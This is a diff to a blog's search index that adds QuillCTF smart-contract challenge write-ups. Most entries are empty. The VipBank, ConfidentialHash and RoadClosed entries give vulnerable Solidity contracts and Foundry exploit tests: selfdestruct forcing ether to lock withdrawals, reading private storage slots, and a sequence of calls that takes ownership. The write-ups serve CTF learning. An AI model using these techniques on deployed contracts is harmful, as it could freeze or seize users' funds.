@@ -4,6 +4,246 @@
   
     
     <entry>
+      <title>QuillCTF-10.Gate</title>
+      <link href="/2024/01/22/QuillCTF-10-Gate/"/>
+      <url>/2024/01/22/QuillCTF-10-Gate/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> QuillCTF </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>QuillCTF-9.WETH10</title>
+      <link href="/2024/01/22/QuillCTF-9-WETH10/"/>
+      <url>/2024/01/22/QuillCTF-9-WETH10/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> QuillCTF </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>QuillCTF-8.Pelusa</title>
+      <link href="/2024/01/22/QuillCTF-8-Pelusa/"/>
+      <url>/2024/01/22/QuillCTF-8-Pelusa/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> QuillCTF </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>QuillCTF-7.TrueXOR</title>
+      <link href="/2024/01/22/QuillCTF-7-TrueXOR/"/>
+      <url>/2024/01/22/QuillCTF-7-TrueXOR/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> QuillCTF </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>QuillCTF-6.Collatzpuzzle</title>
+      <link href="/2024/01/22/QuillCTF-6-Collatzpuzzle/"/>
+      <url>/2024/01/22/QuillCTF-6-Collatzpuzzle/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> QuillCTF </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>QuillCTF-5.D31eg4t3</title>
+      <link href="/2024/01/22/QuillCTF-5-D31eg4t3/"/>
+      <url>/2024/01/22/QuillCTF-5-D31eg4t3/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> QuillCTF </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>QuillCTF-4.SafeNft</title>
+      <link href="/2024/01/22/QuillCTF-4-SafeNft/"/>
+      <url>/2024/01/22/QuillCTF-4-SafeNft/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> QuillCTF </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>QuillCTF-3.VipBank</title>
+      <link href="/2024/01/22/QuillCTF-3-VipBank/"/>
+      <url>/2024/01/22/QuillCTF-3-VipBank/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“This Bank is only for its VIP Customers.”</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ul><li>At any cost, lock the VIP user balance forever into the contract.</li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">contract VIP_Bank&#123;</span><br><span class="line"></span><br><span class="line">    address public manager;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; bool) public VIP;</span><br><span class="line">    uint public maxETH = 0.5 ether;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        manager = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyManager() &#123;</span><br><span class="line">        require(msg.sender == manager , &quot;you are not manager&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyVIP() &#123;</span><br><span class="line">        require(VIP[msg.sender] == true, &quot;you are not our VIP customer&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addVIP(address addr) public onlyManager &#123;</span><br><span class="line">        VIP[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable onlyVIP &#123;</span><br><span class="line">        require(msg.value &lt;= 0.05 ether, &quot;Cannot deposit more than 0.05 ETH per transaction&quot;);</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint _amount) public onlyVIP &#123;</span><br><span class="line">        require(address(this).balance &lt;= maxETH, &quot;Cannot withdraw more than 0.5 ETH per transaction&quot;);</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount, &quot;Not enough ether&quot;);</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">        (bool success,) = payable(msg.sender).call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Withdraw Failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contractBalance() public view returns (uint)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity 0.8.7;import &quot;forge-std/Test.sol&quot;;import &quot;../src/3-VipBank/Bank.sol&quot;;contract Attack &#123;    address public target;    constructor(address _target) &#123;        target = _target;    &#125;    receive() external payable &#123;&#125;    function exp() public &#123;        selfdestruct(payable(target));    &#125;&#125;contract BankTest is Test &#123;    VIP_Bank target;    address admin;    address attacker;    address customer;    function setUp() public &#123;        admin = makeAddr(&quot;admin&quot;);        attacker = makeAddr(&quot;attacker&quot;);        customer = makeAddr(&quot;customer&quot;);        vm.deal(attacker, 10 ether);        vm.deal(customer, 10 ether);        vm.startPrank(admin);        target = new VIP_Bank();        target.addVIP(customer);        vm.stopPrank();    &#125;    function att() public &#123;        vm.startPrank(customer);        target.deposit&#123;value: 0.05 ether&#125;();        vm.stopPrank();        vm.startPrank(attacker);        assertEq(0.05 ether, target.contractBalance());        Attack attack = new Attack(address(target));        payable(attack).transfer(1 ether);        attack.exp();        vm.stopPrank();        assertEq(target.contractBalance(), 1.05 ether);        vm.startPrank(customer);        vm.expectRevert();        target.withdraw(0.05 ether);    &#125;&#125;</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> QuillCTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> solidity </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>QuillCTF-2.ConfidentialHash</title>
+      <link href="/2024/01/22/QuillCTF-2-ConfidentialHash/"/>
+      <url>/2024/01/22/QuillCTF-2-ConfidentialHash/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“Private doesn’t mean confidential”</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ul><li>Find the keccak256 hash of aliceHash and bobHash.</li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">contract Confidential &#123;</span><br><span class="line">    string public firstUser = &quot;ALICE&quot;;</span><br><span class="line">    uint public alice_age = 24;</span><br><span class="line">bytes32 private ALICE_PRIVATE_KEY; //Super Secret Key</span><br><span class="line">    bytes32 public ALICE_DATA = &quot;QWxpY2UK&quot;;</span><br><span class="line">    bytes32 private aliceHash = hash(ALICE_PRIVATE_KEY, ALICE_DATA);</span><br><span class="line"></span><br><span class="line">    string public secondUser = &quot;BOB&quot;;</span><br><span class="line">    uint public bob_age = 21;</span><br><span class="line">    bytes32 private BOB_PRIVATE_KEY; // Super Secret Key</span><br><span class="line">    bytes32 public BOB_DATA = &quot;Qm9iCg&quot;;</span><br><span class="line">    bytes32 private bobHash = hash(BOB_PRIVATE_KEY, BOB_DATA);</span><br><span class="line"></span><br><span class="line">constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function hash(bytes32 key1, bytes32 key2) public pure returns (bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(key1, key2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function checkthehash(bytes32 _hash) public view returns(bool)&#123;</span><br><span class="line">        require (_hash == hash(aliceHash, bobHash));</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>Read the storage</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">string public firstUser = &quot;ALICE&quot;; //0</span><br><span class="line">    uint256 public alice_age = 24; //1</span><br><span class="line">    bytes32 private ALICE_PRIVATE_KEY; //Super Secret Key//2</span><br><span class="line">    bytes32 public ALICE_DATA = &quot;QWxpY2UK&quot;; //3</span><br><span class="line">    bytes32 private aliceHash = hash(ALICE_PRIVATE_KEY, ALICE_DATA); //4</span><br><span class="line"></span><br><span class="line">    string public secondUser = &quot;BOB&quot;; //5</span><br><span class="line">    uint256 public bob_age = 21; //6</span><br><span class="line">    bytes32 private BOB_PRIVATE_KEY; // Super Secret Key//7</span><br><span class="line">    bytes32 public BOB_DATA = &quot;Qm9iCg&quot;; //8</span><br><span class="line">    bytes32 private bobHash = hash(BOB_PRIVATE_KEY, BOB_DATA); //9</span><br></pre></td></tr></table></figure><p>or use forge inspect</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">-&gt; % forge inspect Confidential storage           </span><br><span class="line">&#123;</span><br><span class="line">  &quot;storage&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45010,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;firstUser&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;0&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_string_storage&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45013,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;alice_age&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;1&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_uint256&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45015,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;ALICE_PRIVATE_KEY&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;2&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45018,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;ALICE_DATA&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;3&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45024,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;aliceHash&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;4&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45027,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;secondUser&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;5&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_string_storage&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45030,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;bob_age&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;6&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_uint256&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45032,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;BOB_PRIVATE_KEY&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;7&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45035,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;BOB_DATA&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;8&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;astId&quot;: 45041,</span><br><span class="line">      &quot;contract&quot;: &quot;src/2-Hash/Hash.sol:Confidential&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;bobHash&quot;,</span><br><span class="line">      &quot;offset&quot;: 0,</span><br><span class="line">      &quot;slot&quot;: &quot;9&quot;,</span><br><span class="line">      &quot;type&quot;: &quot;t_bytes32&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;types&quot;: &#123;</span><br><span class="line">    &quot;t_bytes32&quot;: &#123;</span><br><span class="line">      &quot;encoding&quot;: &quot;inplace&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;bytes32&quot;,</span><br><span class="line">      &quot;numberOfBytes&quot;: &quot;32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;t_string_storage&quot;: &#123;</span><br><span class="line">      &quot;encoding&quot;: &quot;bytes&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;string&quot;,</span><br><span class="line">      &quot;numberOfBytes&quot;: &quot;32&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;t_uint256&quot;: &#123;</span><br><span class="line">      &quot;encoding&quot;: &quot;inplace&quot;,</span><br><span class="line">      &quot;label&quot;: &quot;uint256&quot;,</span><br><span class="line">      &quot;numberOfBytes&quot;: &quot;32&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><ul><li>Use load Cheatcode</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/2-Hash/Hash.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract testCon is Test, Confidential &#123;</span><br><span class="line">    Confidential challenge;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        challenge = new Confidential();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testConfidential() public &#123;</span><br><span class="line">        bytes32 aliceHash = vm.load(address(challenge), bytes32(uint256(4)));</span><br><span class="line">        bytes32 bobHash = vm.load(address(challenge), bytes32(uint256(9)));</span><br><span class="line">        bytes32 hash_value = challenge.hash(aliceHash, bobHash);</span><br><span class="line"></span><br><span class="line">        bool isOK = challenge.checkthehash(hash_value);</span><br><span class="line">        assert(isOK == true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> QuillCTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> solidity </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>QuillCTF-1.RoadClosed</title>
+      <link href="/2024/01/22/QuillCTF-1-RoadClosed/"/>
+      <url>/2024/01/22/QuillCTF-1-RoadClosed/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“We keep out the wrong people – by letting anyone in.”</span><br></pre></td></tr></table></figure><h2 id="Objective"><a href="#Objective" class="headerlink" title="Objective"></a>Objective</h2><ol><li>Become the owner of the contract</li><li>Change the value of hacked to true</li></ol><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: GPL-3.0</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">contract RoadClosed &#123;</span><br><span class="line"></span><br><span class="line">    bool hacked;</span><br><span class="line">    address owner;</span><br><span class="line">address pwner;</span><br><span class="line">    mapping(address =&gt; bool) whitelistedMinters;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function isContract(address addr) public view returns (bool) &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(addr)</span><br><span class="line">            &#125;</span><br><span class="line">        return size &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isOwner() public view returns(bool)&#123;</span><br><span class="line">        if (msg.sender==owner) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        else return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) public &#123;</span><br><span class="line">        require(!isContract(addr),&quot;Contracts are not allowed&quot;);</span><br><span class="line">        whitelistedMinters[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function changeOwner(address addr) public &#123;</span><br><span class="line">        require(whitelistedMinters[addr], &quot;You are not whitelisted&quot;);</span><br><span class="line">require(msg.sender == addr, &quot;address must be msg.sender&quot;);</span><br><span class="line">        require(addr != address(0), &quot;Zero address&quot;);</span><br><span class="line">        owner = addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn(address addr) external payable&#123;</span><br><span class="line">        require(!isContract(msg.sender), &quot;Contracts are not allowed&quot;);</span><br><span class="line">require(msg.sender == addr, &quot;address must be msg.sender&quot;);</span><br><span class="line">        require (msg.sender == owner, &quot;Must be owner&quot;);</span><br><span class="line">        hacked = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() external payable &#123;</span><br><span class="line">        require(msg.sender == pwner);</span><br><span class="line">        hacked = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isHacked() public view returns(bool) &#123;</span><br><span class="line">        return hacked;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>Just call function one by one.</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: SEE LICENSE IN LICENSE</span><br><span class="line">pragma solidity 0.8.7;</span><br><span class="line"></span><br><span class="line">import &quot;../src/1-RoadClosed/roadclosed.sol&quot;;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract RoadClosedTest is Test &#123;</span><br><span class="line">    RoadClosed challenge;</span><br><span class="line"></span><br><span class="line">    address public deployer;</span><br><span class="line">    address public pwner;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.startPrank(deployer);</span><br><span class="line">        challenge = new RoadClosed();</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        pwner = makeAddr(&quot;0xdeadbeef&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testOwner() public &#123;</span><br><span class="line">        vm.startPrank(deployer);</span><br><span class="line">        assertEq(challenge.isOwner(), true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testStatus() public &#123;</span><br><span class="line">        vm.startPrank(pwner);</span><br><span class="line">        assertEq(challenge.isHacked(), false);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttack() public &#123;</span><br><span class="line">        vm.startPrank(pwner);</span><br><span class="line">        challenge.addToWhitelist(pwner);</span><br><span class="line">        challenge.changeOwner(pwner);</span><br><span class="line">        challenge.pwn(pwner);</span><br><span class="line">        assertEq(challenge.isHacked(), true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> QuillCTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Solidity </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>About_FlashLoans</title>
+      <link href="/2024/01/18/About-FlashLoans/"/>
+      <url>/2024/01/18/About-FlashLoans/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>QuillCTF-Season1</title>
